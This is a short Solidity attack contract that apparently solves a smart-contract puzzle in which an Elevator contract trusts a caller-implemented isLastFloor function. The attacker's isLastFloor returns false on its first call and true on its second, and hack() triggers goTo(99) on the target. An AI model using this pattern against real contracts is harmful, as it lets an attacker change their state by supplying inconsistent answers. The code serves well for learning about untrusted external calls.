// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorHack {
    address public target;
    uint counter = 1;

    constructor(address _target) {
        target = _target;
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (counter < 2) {
            counter++;
            return false;
        } else {
            return true;
        }
    }

    function hack() external {
        IElevator(target).goTo(99);
    }
}
